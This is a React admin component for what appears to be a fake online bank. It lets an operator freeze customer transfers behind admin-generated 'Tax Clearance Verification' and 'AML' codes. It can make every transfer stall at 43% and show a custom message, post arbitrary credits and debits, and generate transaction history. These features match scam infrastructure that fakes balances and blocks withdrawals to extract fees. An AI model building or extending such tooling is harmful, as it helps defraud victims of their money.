"use client";

import { useEffect, useState, useTransition } from "react";
import {
  AlertTriangle,
  Check,
  Copy,
  KeyRound,
  Loader2,
  Plus,
  RefreshCw,
  ShieldOff,
  Sparkles,
  X,
} from "lucide-react";
import { toast } from "sonner";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  addAccountTransactionAction,
  generateAmlCodeAction,
  generateTcvCodeAction,
  setAccountCurrencyAction,
  setAccountStatusV2Action,
  type AccountStatusV2,
  type AdminState,
} from "@/app/actions/admin";
import { CURRENCIES } from "@/lib/currencies";
import { GenerateHistoryModal } from "./GenerateHistoryModal";

type StatusKey = "active" | "frozen" | "code" | "custom";

const STATUS_LABEL: Record<StatusKey, string> = {
  active: "Active",
  frozen: "Frozen",
  code: "Code",
  custom: "Custom",
};

export function AccountAdminActions({
  accountId,
  accountName,
  accountType,
  status,
  tcvCode,
  amlCode,
  customMessage,
  currency,
}: {
  accountId: number;
  accountName: string;
  accountType: string;
  status: string;
  tcvCode: string | null;
  amlCode: string | null;
  customMessage: string | null;
  currency: string;
}) {
  const [pending, start] = useTransition();
  const [panel, setPanel] = useState<null | "code" | "custom" | "txn">(null);
  const [historyOpen, setHistoryOpen] = useState(false);
  const [tcv, setTcv] = useState<string | null>(tcvCode);
  const [aml, setAml] = useState<string | null>(amlCode);
  const [customText, setCustomText] = useState(customMessage ?? "");
  const [currentCurrency, setCurrentCurrency] = useState(currency);

  useEffect(() => {
    setTcv(tcvCode);
    setAml(amlCode);
    setCustomText(customMessage ?? "");
    setCurrentCurrency(currency);
  }, [tcvCode, amlCode, customMessage, currency]);

  function onPickCurrency(next: string) {
    if (next === currentCurrency) return;
    setCurrentCurrency(next);
    start(async () => {
      const res = await setAccountCurrencyAction(accountId, next);
      if (res.ok) {
        toast.success(res.message ?? `Currency set to ${next}.`);
      } else {
        // Roll back the optimistic update on failure.
        setCurrentCurrency(currency);
        toast.error(res.message ?? "Couldn't change currency.");
      }
    });
  }

  function applyStatus(next: AccountStatusV2, payload?: { customMessage?: string }) {
    start(async () => {
      const res = await setAccountStatusV2Action(accountId, next, payload);
      if (res.ok) {
        toast.success(res.message ?? `Status set to ${next}.`);
        if (next === "custom") setPanel(null);
        if (next === "code") setPanel("code");
        else if (next !== "custom") setPanel(null);
      } else {
        toast.error(res.message ?? "Couldn't change status.");
      }
    });
  }

  function onPickStatus(value: StatusKey) {
    if (value === "active" || value === "frozen") {
      applyStatus(value);
      return;
    }
    if (value === "code") {
      // Set status now; admin can generate codes inside the panel.
      applyStatus("code");
      return;
    }
    if (value === "custom") {
      // Open panel — actual save happens when admin clicks Save.
      setPanel("custom");
    }
  }

  function genTcv() {
    start(async () => {
      const res = await generateTcvCodeAction(accountId);
      if (res.ok && res.code) {
        setTcv(res.code);
        toast.success("TCV code generated.");
      } else {
        toast.error(res.message ?? "Couldn't generate TCV.");
      }
    });
  }

  function genAml() {
    start(async () => {
      const res = await generateAmlCodeAction(accountId);
      if (res.ok && res.code) {
        setAml(res.code);
        toast.success("AML code generated.");
      } else {
        toast.error(res.message ?? "Couldn't generate AML.");
      }
    });
  }

  const currentStatusKey: StatusKey =
    status === "active" || status === "frozen" || status === "code" || status === "custom"
      ? (status as StatusKey)
      : "active";

  return (
    <div
      className="pn-admin-actions flex items-center gap-2 overflow-x-auto justify-end text-xs"
      role="toolbar"
      aria-label="Account actions"
    >
      <select
        value={currentStatusKey}
        onChange={(e) => onPickStatus(e.target.value as StatusKey)}
        disabled={pending}
        className="h-8 shrink-0 rounded-full border border-border bg-background px-3 text-xs font-medium disabled:opacity-60"
        aria-label="Account status"
      >
        <option value="active">Status · Active</option>
        <option value="frozen">Status · Freeze</option>
        <option value="code">Status · Code</option>
        <option value="custom">Status · Custom</option>
      </select>

      <select
        value={currentCurrency}
        onChange={(e) => onPickCurrency(e.target.value)}
        disabled={pending}
        className="h-8 max-w-[140px] shrink-0 rounded-full border border-border bg-background px-3 text-xs font-medium disabled:opacity-60"
        aria-label="Account currency"
        title="Account currency"
      >
        {CURRENCIES.map((c) => (
          <option key={c.code} value={c.code}>
            Currency · {c.code}
          </option>
        ))}
      </select>

      {currentStatusKey === "code" && (
        <button
          type="button"
          onClick={() => setPanel(panel === "code" ? null : "code")}
          className="inline-flex h-8 shrink-0 items-center gap-1 whitespace-nowrap rounded-full bg-violet-500/15 px-3 font-medium text-violet-500 hover:bg-violet-500/25"
        >
          <KeyRound className="size-3.5" /> Codes
        </button>
      )}
      {currentStatusKey === "custom" && (
        <button
          type="button"
          onClick={() => setPanel(panel === "custom" ? null : "custom")}
          className="inline-flex h-8 shrink-0 items-center gap-1 whitespace-nowrap rounded-full bg-gold-500/15 px-3 font-medium text-gold-700 hover:bg-gold-500/25 dark:text-gold-300"
        >
          <AlertTriangle className="size-3.5" /> Message
        </button>
      )}

      <button
        type="button"
        onClick={() => setPanel(panel === "txn" ? null : "txn")}
        className="inline-flex h-8 shrink-0 items-center gap-1 whitespace-nowrap rounded-full bg-muted px-3 font-medium hover:bg-muted/70"
      >
        <Plus className="size-3.5" /> Add transaction
      </button>

      <button
        type="button"
        onClick={() => setHistoryOpen(true)}
        className="inline-flex h-8 shrink-0 items-center gap-1 whitespace-nowrap rounded-full bg-violet-500/10 px-3 font-medium text-violet-500 hover:bg-violet-500/20"
      >
        <Sparkles className="size-3.5" /> Generate history
      </button>

      {historyOpen && (
        <GenerateHistoryModal
          accountId={accountId}
          accountName={accountName}
          accountCurrency={currentCurrency}
          accountType={accountType}
          onClose={() => setHistoryOpen(false)}
        />
      )}

      {panel === "code" && (
        <Panel onClose={() => setPanel(null)} title="Verification codes">
          <CodePanel
            tcv={tcv}
            aml={aml}
            pending={pending}
            onGenTcv={genTcv}
            onGenAml={genAml}
          />
        </Panel>
      )}
      {panel === "custom" && (
        <Panel onClose={() => setPanel(null)} title="Custom interrupt message">
          <CustomPanel
            text={customText}
            setText={setCustomText}
            onSave={() =>
              applyStatus("custom", { customMessage: customText.trim() })
            }
            pending={pending}
          />
        </Panel>
      )}
      {panel === "txn" && (
        <Panel onClose={() => setPanel(null)} title="Add transaction">
          <AddTxnPanel
            accountId={accountId}
            onPosted={() => setPanel(null)}
          />
        </Panel>
      )}
    </div>
  );
}

// ────────────────────────────────────────────────────────────────────────
// Floating panel shell
// ────────────────────────────────────────────────────────────────────────

function Panel({
  title,
  onClose,
  children,
}: {
  title: string;
  onClose: () => void;
  children: React.ReactNode;
}) {
  return (
    <>
      <button
        type="button"
        aria-hidden
        onClick={onClose}
        className="fixed inset-0 z-40 cursor-default bg-foreground/30"
      />
      <div className="fixed left-1/2 top-1/2 z-50 w-[min(420px,calc(100vw-2rem))] -translate-x-1/2 -translate-y-1/2 overflow-hidden rounded-2xl border border-border bg-card shadow-elev">
        <div className="flex items-center justify-between border-b border-border px-5 py-3">
          <h3 className="font-display text-base font-semibold">{title}</h3>
          <button
            type="button"
            onClick={onClose}
            className="rounded-md p-1 text-muted-foreground hover:bg-muted hover:text-foreground"
            aria-label="Close"
          >
            <X className="size-4" />
          </button>
        </div>
        <div className="px-5 py-4 text-sm">{children}</div>
      </div>
    </>
  );
}

// ────────────────────────────────────────────────────────────────────────
// Code panel
// ────────────────────────────────────────────────────────────────────────

function CodePanel({
  tcv,
  aml,
  pending,
  onGenTcv,
  onGenAml,
}: {
  tcv: string | null;
  aml: string | null;
  pending: boolean;
  onGenTcv: () => void;
  onGenAml: () => void;
}) {
  return (
    <div className="space-y-5 text-left">
      <p className="text-xs text-muted-foreground">
        Generate the codes the user must enter to clear the gates during a wire
        or external-bank send. Codes apply to every qualifying transfer on this
        account until status changes.
      </p>

      <CodeRow
        label="Tax Clearance Verification (TCV)"
        helper="10-character alphanumeric — required at the network-submit step."
        code={tcv}
        pending={pending}
        onGenerate={onGenTcv}
      />
      <CodeRow
        label="Anti-Money-Laundering (AML)"
        helper="12-character alphanumeric — required just before completion."
        code={aml}
        pending={pending}
        onGenerate={onGenAml}
      />
    </div>
  );
}

function CodeRow({
  label,
  helper,
  code,
  pending,
  onGenerate,
}: {
  label: string;
  helper: string;
  code: string | null;
  pending: boolean;
  onGenerate: () => void;
}) {
  return (
    <div className="rounded-xl border border-border bg-background p-3">
      <div className="flex items-start justify-between gap-3">
        <div>
          <p className="text-xs font-semibold">{label}</p>
          <p className="mt-0.5 text-xs text-muted-foreground">{helper}</p>
        </div>
        <button
          type="button"
          onClick={onGenerate}
          disabled={pending}
          className="inline-flex h-8 shrink-0 items-center gap-1 rounded-full bg-violet-500 px-3 text-xs font-semibold text-white hover:bg-violet-600 disabled:opacity-60"
        >
          {pending ? (
            <Loader2 className="size-3.5 animate-spin" />
          ) : code ? (
            <>
              <RefreshCw className="size-3.5" />
              Regenerate
            </>
          ) : (
            <>
              <KeyRound className="size-3.5" />
              Generate
            </>
          )}
        </button>
      </div>
      <div className="mt-2 flex items-stretch gap-2">
        <p
          className={
            "flex-1 select-all rounded-md bg-muted px-3 py-2 font-mono text-sm tracking-[0.2em] " +
            (code ? "" : "text-muted-foreground")
          }
        >
          {code ?? "—  not generated yet  —"}
        </p>
        <CopyButton value={code} label={label} />
      </div>
    </div>
  );
}

function CopyButton({ value, label }: { value: string | null; label: string }) {
  const [copied, setCopied] = useState(false);

  async function onCopy() {
    if (!value) return;
    try {
      await navigator.clipboard.writeText(value);
      setCopied(true);
      toast.success(`${label} code copied.`);
      setTimeout(() => setCopied(false), 1500);
    } catch {
      toast.error("Couldn't copy — your browser blocked clipboard access.");
    }
  }

  return (
    <button
      type="button"
      onClick={onCopy}
      disabled={!value}
      aria-label={`Copy ${label} code`}
      title={value ? "Copy code" : "No code to copy"}
      className="inline-flex w-9 shrink-0 items-center justify-center rounded-md border border-border bg-background text-muted-foreground transition hover:bg-muted hover:text-foreground disabled:cursor-not-allowed disabled:opacity-40"
    >
      {copied ? (
        <Check className="size-4 text-success" />
      ) : (
        <Copy className="size-4" />
      )}
    </button>
  );
}

// ────────────────────────────────────────────────────────────────────────
// Custom-message panel
// ────────────────────────────────────────────────────────────────────────

function CustomPanel({
  text,
  setText,
  onSave,
  pending,
}: {
  text: string;
  setText: (v: string) => void;
  onSave: () => void;
  pending: boolean;
}) {
  return (
    <div className="space-y-3 text-left">
      <p className="text-xs text-muted-foreground">
        Every transfer the user attempts will run to 43% before pausing and
        displaying this message. Plain text, up to 400 characters.
      </p>
      <textarea
        value={text}
        onChange={(e) => setText(e.target.value.slice(0, 400))}
        rows={5}
        className="w-full rounded-lg border border-border bg-background p-3 text-sm"
        placeholder="e.g. Compliance review pending — please contact your account officer to clear this transfer."
      />
      <div className="flex items-center justify-between text-xs text-muted-foreground">
        <span>{400 - text.length} chars left</span>
        <button
          type="button"
          onClick={onSave}
          disabled={pending || text.trim().length < 4}
          className="inline-flex h-9 items-center gap-1.5 rounded-full bg-violet-500 px-5 text-xs font-semibold text-white hover:bg-violet-600 disabled:opacity-60"
        >
          {pending ? (
            <Loader2 className="size-3.5 animate-spin" />
          ) : (
            <>
              <ShieldOff className="size-3.5" /> Save and activate
            </>
          )}
        </button>
      </div>
    </div>
  );
}

// ────────────────────────────────────────────────────────────────────────
// Add-transaction panel
// ────────────────────────────────────────────────────────────────────────

const initialTxn: AdminState = { ok: false };

function AddTxnPanel({
  accountId,
  onPosted,
}: {
  accountId: number;
  onPosted: () => void;
}) {
  const [type, setType] = useState<"credit" | "debit">("credit");
  const [state, setState] = useState<AdminState>(initialTxn);
  const [pending, setPending] = useState(false);

  async function onSubmit(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    setPending(true);
    setState(initialTxn);
    const fd = new FormData(e.currentTarget);
    fd.set("type", type);
    const res = await addAccountTransactionAction(initialTxn, fd);
    setPending(false);
    setState(res);
    if (res.ok) {
      toast.success(res.message ?? "Transaction posted.");
      onPosted();
    } else if (res.message && !res.fieldErrors) {
      toast.error(res.message);
    }
  }

  const isCredit = type === "credit";

  return (
    <form onSubmit={onSubmit} className="space-y-4 text-left">
      <input type="hidden" name="accountId" value={accountId} />

      <div className="grid grid-cols-2 gap-1 rounded-full bg-muted p-1 text-xs">
        <button
          type="button"
          onClick={() => setType("credit")}
          className={
            "rounded-full px-3 py-1.5 font-semibold transition " +
            (isCredit
              ? "bg-card text-foreground shadow-sm"
              : "text-muted-foreground hover:text-foreground")
          }
        >
          Credit (deposit)
        </button>
        <button
          type="button"
          onClick={() => setType("debit")}
          className={
            "rounded-full px-3 py-1.5 font-semibold transition " +
            (!isCredit
              ? "bg-card text-foreground shadow-sm"
              : "text-muted-foreground hover:text-foreground")
          }
        >
          Debit (withdrawal)
        </button>
      </div>

      <div className="space-y-1.5">
        <Label htmlFor="amount" className="text-xs font-medium">
          Amount
        </Label>
        <div className="relative">
          <span className="pointer-events-none absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground">
            $
          </span>
          <Input
            id="amount"
            name="amount"
            type="number"
            step="0.01"
            min="0.01"
            required
            placeholder="0.00"
            className="pl-7"
          />
        </div>
        {state.fieldErrors?.amount && (
          <p className="text-xs text-danger">{state.fieldErrors.amount}</p>
        )}
      </div>

      <div className="space-y-1.5">
        <Label htmlFor="counterpartyName" className="text-xs font-medium">
          {isCredit ? "Sender name" : "Receiver name"}
        </Label>
        <Input
          id="counterpartyName"
          name="counterpartyName"
          required
          maxLength={120}
          placeholder={
            isCredit ? "Who sent the funds?" : "Who is receiving the funds?"
          }
        />
        {state.fieldErrors?.counterpartyName && (
          <p className="text-xs text-danger">
            {state.fieldErrors.counterpartyName}
          </p>
        )}
      </div>

      <div className="grid grid-cols-2 gap-3">
        <div className="space-y-1.5">
          <Label htmlFor="counterpartyBank" className="text-xs font-medium">
            Bank
          </Label>
          <Input
            id="counterpartyBank"
            name="counterpartyBank"
            maxLength={120}
            placeholder="Wells Fargo, Chase, …"
          />
        </div>
        <div className="space-y-1.5">
          <Label
            htmlFor="counterpartyAccountNumber"
            className="text-xs font-medium"
          >
            Account number
          </Label>
          <Input
            id="counterpartyAccountNumber"
            name="counterpartyAccountNumber"
            maxLength={40}
            placeholder="123456789012"
          />
        </div>
      </div>

      <div className="space-y-1.5">
        <Label htmlFor="remark" className="text-xs font-medium">
          Remark
        </Label>
        <Input
          id="remark"
          name="remark"
          maxLength={160}
          placeholder="What this transaction is for"
        />
      </div>

      <button
        type="submit"
        disabled={pending}
        className="inline-flex h-10 w-full items-center justify-center gap-1.5 rounded-full bg-violet-500 px-5 text-sm font-semibold text-white hover:bg-violet-600 disabled:opacity-60"
      >
        {pending ? (
          <Loader2 className="size-4 animate-spin" />
        ) : (
          <>
            <Plus className="size-4" /> Post {isCredit ? "credit" : "debit"}
          </>
        )}
      </button>
    </form>
  );
}
